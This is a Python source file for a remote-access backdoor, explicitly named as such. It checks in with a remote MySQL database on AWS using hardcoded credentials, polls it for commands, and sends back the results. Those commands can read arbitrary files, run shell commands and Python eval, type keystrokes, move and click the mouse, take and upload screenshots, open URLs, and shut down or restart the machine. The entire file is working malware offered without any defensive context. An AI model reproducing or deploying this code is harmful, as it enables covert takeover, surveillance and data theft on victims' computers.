import mysql.connector,socket,os,time,datetime,keyboard,pyautogui,webbrowser,requests

pyautogui.FAILSAFE = False
class backdoor:
    def __init__(self):

        self.db = mysql.connector.connect(
            host="database.cun6wzt30wpz.us-west-1.rds.amazonaws.com",
            user="admin",
            password="databasepassword",
            database="DB",
        )
        self.cursor = self.db.cursor()

        self.cursor.execute("SELECT * FROM backdoor_computer")
        pcs = self.cursor.fetchall()
        self.pc_id = None
        for pc in pcs:
            if socket.gethostname() == pc[2]:
                self.pc_id = pc[0]

        if self.pc_id == None:
            sql_code = """INSERT INTO backdoor_computer
                      (pc_name, last_online)
                      VALUES (%s, %s)
            """
            
            self.cursor.execute(sql_code, (socket.gethostname(),datetime.datetime.utcnow()))
            self.db.commit()

            self.cursor.execute("SELECT * FROM backdoor_computer")
            pcs = self.cursor.fetchall()
            for pc in pcs:
                if socket.gethostname() == pc[2]:
                    self.pc_id = pc[0]


        while True:
            sql_code = """UPDATE backdoor_computer
                        SET last_online = %s
                        WHERE id = %s
                """
            self.cursor.execute(sql_code, (datetime.datetime.utcnow(), self.pc_id))
            self.db.commit()
            self.command_thread()
            time.sleep(1)
        

    def run(self, code):
        output = ""
        commands_to_execute = code.split("\r\n")
        lines_to_skip = []

        for line, command in enumerate(commands_to_execute):
            if line in lines_to_skip: continue
            if command.startswith("read"):
                command = command.replace(")", "")
                command_args = command.split("(")
                files_to_read = command_args[1].split(",")
                for file in files_to_read:
                    file = file.replace('"', '')
                    file = file.replace("'", "")
                    file = file.replace(" ", "")
                    try:
                        output += file + "\n"
                        with open(file, "r") as r:
                            output += r.read() + "\n"
                    except FileNotFoundError:
                        output += "FileNotFoundError: " + file + " does not exist\n"
            elif command.startswith("keyboard"):
                for i in range(1,len(commands_to_execute)):
                    lines_to_skip.append(i+line)
                    if commands_to_execute[i+line].startswith(";") or commands_to_execute[i+line].endswith(";"):
                        break

                    if commands_to_execute[i+line].startswith("`") and commands_to_execute[i+line].endswith("`"):
                        execute_key_word = commands_to_execute[i+line]
                        execute_key_word = execute_key_word.replace("`", "")
                        keyboard.send(execute_key_word)
                        continue
                    
                    keyboard.write(commands_to_execute[i+line])
            elif command.startswith("cd"):
                directory_to_change = command.split(" ")
                if len(directory_to_change) > 1:
                    os.chdir(directory_to_change[1])
                output += os.popen("cd").read() + '\n'
            elif command.startswith("delay"):
                delay_command = command.split("(")
                time_to_delay = delay_command[1].replace(")", "")
                time.sleep(float(time_to_delay))
            elif command.startswith("screenshot"):
                delay_command = command.split("(")
                time_to_delay = delay_command[1].replace(")", "")
                myScreenshot = pyautogui.screenshot()
                myScreenshot.save('screenshot.png')
                sample_file = open("screenshot.png", "rb")
                upload_file = {"file": sample_file}
                r = requests.post("http://127.0.0.1:8000/screenshot/", files = upload_file)
                os.remove("screenshot.png")
            elif command.startswith("ls"):
                output = ""
                for i in os.listdir():
                    output += i + "\n"
            elif command.startswith("power"):
                power_command = command.split("(")
                power_command_argument = power_command[1].replace(")", "")
                power_command_argument = power_command_argument.replace('"', '')
                power_command_argument = power_command_argument.replace("'", "")
                if power_command_argument.lower() == "shutdown":
                    os.system("shutdown /p")
                    output += "Shutting down the pc\n"
                    continue
                elif power_command_argument.lower() == "restart":
                    os.system("shutdown /r")
                    output += "Restarting the pc\n"
                    continue
                elif power_command_argument.lower() == "sleep":
                    os.system("shutdown /l")
                    output += "Computer is going on sleep"
                    continue
                output += power_command_argument + " is a invalid argument, (shutdown, restart, sleep)"
            elif command.startswith("python"):
                python_code = ""
                for i in range(1, len(commands_to_execute)):
                    lines_to_skip.append(i+line)
                    if commands_to_execute[i+line].startswith(";") or commands_to_execute[i+line].endswith(";"):
                        break
                    
                    python_code += commands_to_execute[i+line] + "\n"
                
                output += eval(python_code)
            elif command.startswith("web"):
                browser_command = command.split("(")[1]
                if len(browser_command) > 0:
                    browser_command = browser_command.replace("(", "")
                    browser_command = browser_command.replace(")", "")
                    browser_command = browser_command.replace('"', '')
                    webbrowser.open_new(browser_command)
                else:
                    output += "No argument provided\n"
            elif command.startswith("mouse"):
                mouse_command = command.split(".")
                if len(mouse_command) > 1:
                    mouse_command = mouse_command[1]
                    if mouse_command.startswith("right_click"):
                        mouse_command_args = mouse_command.replace("right_click", "")
                        mouse_command_args = mouse_command_args.replace("(", "")
                        mouse_command_args = mouse_command_args.replace(")", "")
                        mouse_command_args = mouse_command_args.replace(" ", "")
                        mouse_command_args = mouse_command_args.split(",")
                        if len(mouse_command_args) > 1:
                            mouse_command_args = list(map(int,mouse_command_args))
                            pyautogui.click(mouse_command_args[0], mouse_command_args[1], button="right")
                            continue
                        else:
                            pyautogui.click()
                            continue
                    elif mouse_command.startswith("click"):
                        mouse_command_args = mouse_command.replace("click", "")
                        mouse_command_args = mouse_command_args.replace("(", "")
                        mouse_command_args = mouse_command_args.replace(")", "")
                        mouse_command_args = mouse_command_args.replace(" ", "")
                        mouse_command_args = mouse_command_args.split(",")
                        if len(mouse_command_args) > 1:
                            mouse_command_args = list(map(int,mouse_command_args))
                            pyautogui.click(mouse_command_args[0], mouse_command_args[1])
                            continue
                        else:
                            pyautogui.click()
                            continue
                    elif mouse_command.startswith("move"):
                        mouse_command_args = mouse_command.replace("move", "")
                        mouse_command_args = mouse_command_args.replace("(", "")
                        mouse_command_args = mouse_command_args.replace(")", "")
                        mouse_command_args = mouse_command_args.replace(" ", "")
                        mouse_command_args = mouse_command_args.split(",")
                        mouse_command_args = list(map(int,mouse_command_args))
                        if len(mouse_command_args) == 2:
                            pyautogui.moveTo(mouse_command_args[0], mouse_command_args[1])
                            continue
                        else:
                            output += "Invalid amount of arguments. Two arguments needed. X,Y\n"
                    elif mouse_command.startswith("spam_click"):
                        mouse_command_args = mouse_command.replace("spam_click", "")
                        mouse_command_args = mouse_command_args.replace("(", "")
                        mouse_command_args = mouse_command_args.replace(")", "")
                        mouse_command_args = mouse_command_args.replace(" ", "")
                        mouse_command_args = mouse_command_args.split(",")
                        mouse_command_args = list(map(int,mouse_command_args))
                        if len(mouse_command_args) == 3:
                            for i in range(mouse_command_args[2]):
                                pyautogui.click(mouse_command_args[0], mouse_command_args[1])
                            continue
                        elif len(mouse_command_args) == 1:
                            for i in range(mouse_command_args[0]):
                                pyautogui.click()
                            continue
                        else:
                            output += "Invalid amounts of arguments. Only 3 arguments needed, [x,y,amount_of_times_to_click]\n"
                    else:
                        output += "Invalid command [click(),right_click(), move(), spam_click()\n"
            else:
                output += os.popen(command).read() + "\n"
                

        return output
    def command_thread(self):
        self.cursor.execute("SELECT * FROM backdoor_command")
        commands = self.cursor.fetchall()
        for command in commands:
            if command[2] == self.pc_id:
                output = self.run(command[1])
                
                self.cursor.execute(f"DELETE FROM backdoor_command WHERE id={str(command[0])}")
                sql_code = """INSERT INTO backdoor_output
                      (command, output, target_id, time)                 
                      VALUES (%s,%s,%s,%s)
                """
                self.cursor.execute(sql_code, (command[1], output, self.pc_id,datetime.datetime.now()))
                self.db.commit()      

backdoor()



